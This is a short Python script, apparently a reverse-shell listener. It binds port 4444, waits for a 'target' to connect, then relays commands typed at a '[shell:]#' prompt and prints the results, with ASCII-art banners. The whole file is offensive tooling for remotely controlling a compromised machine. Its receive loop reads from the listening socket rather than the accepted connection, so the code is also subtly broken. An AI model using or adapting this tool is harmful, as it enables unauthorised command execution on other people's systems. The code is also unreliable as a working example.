import pyfiglet
import socket,sys

ascii_banner = pyfiglet.figlet_format("@LaZa  \n L1st3N1nG")
print(ascii_banner)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = ''
port = 4444

try :
    s.bind((host,port))
except socket.error as msg :
    print('Bind Failed , Error : ' , msg)
    sys.exit()

s.listen(10)
listening = pyfiglet.figlet_format("@ Hi-Hi .... i Hear You")
print(listening)


conn,addr = s.accept()
ip_target,port_target = addr

print('Targer =====> %s:%s\n'%(ip_target,port_target))

def exitfunc():
    close = pyfiglet.figlet_format("Bye-Bye")
    print(close)
    conn.close()
    s.close()
    sys.exit()
    

while True : 
    try:
        command = input('\n[shell:]#')
        if command == "exit" :
            conn.send(b'%s'%str(command).encode('utf-8'))
            exitfunc()
        elif command == "":
            print('\n Shell must have a command')
        else :
            conn.send(b'%s'%str(command).encode('utf-8'))
            data=b''
            while True :
                part = s.recv(4096)
                data += part
                if len(data) < 4096 : 
                    break
                if len(part) < 4096 :
                    break
            print("\n"+data.decode("utf-8"))
    except socket.error as msg:
        print("Error :",msg)
        exitfunc()
